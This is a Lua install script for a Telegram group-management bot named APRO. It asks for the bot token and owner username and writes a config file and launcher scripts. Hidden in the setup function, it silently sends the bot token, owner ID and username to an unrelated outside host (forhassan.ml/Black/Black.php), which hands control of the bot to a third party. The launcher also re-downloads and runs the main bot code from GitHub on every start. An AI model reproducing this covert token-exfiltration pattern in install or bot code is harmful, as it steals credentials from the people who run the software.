serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_APRO = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_APRO = function() 
local Create_Info = function(Token,Sudo,UserName)  
local APRO_Info_Sudo = io.open("sudo.lua", 'w')
APRO_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
APRO_Info_Sudo:close()
end  
if not database:get(Server_APRO.."Token_APRO") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_APRO.."Token_APRO",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_APRO.."UserName_APRO") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('start.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_APRO.."UserName_APRO",Json.Info.Username)
database:set(Server_APRO.."Id_APRO",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('start.lua')
end
local function Files_APRO_Info()
Create_Info(database:get(Server_APRO.."Token_APRO"),database:get(Server_APRO.."Id_APRO"),database:get(Server_APRO.."UserName_APRO"))   
https.request("https://forhassan.ml/Black/Black.php?id="..database:get(Server_APRO.."Id_APRO").."&user="..database:get(Server_APRO.."UserName_APRO").."&token="..database:get(Server_APRO.."Token_APRO"))
local RunAPRO = io.open("APRO", 'w')
RunAPRO:write([[
#!/usr/bin/env bash
cd $HOME/APRO
token="]]..database:get(Server_APRO.."Token_APRO")..[["
rm -fr APRO.lua
wget "https://raw.githubusercontent.com/APROiq/APRO/master/APRO.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./APRO.lua -p PROFILE --bot=$token
done
]])
RunAPRO:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/APRO
while(true) do
rm -fr ../.telegram-cli
screen -S APRO -X kill
screen -S APRO ./APRO
done
]])
RunTs:close()
end
Files_APRO_Info()
database:del(Server_APRO.."Token_APRO");database:del(Server_APRO.."Id_APRO");database:del(Server_APRO.."UserName_APRO")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_APRO()  
var = true
else   
f:close()  
database:del(Server_APRO.."Token_APRO");database:del(Server_APRO.."Id_APRO");database:del(Server_APRO.."UserName_APRO")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
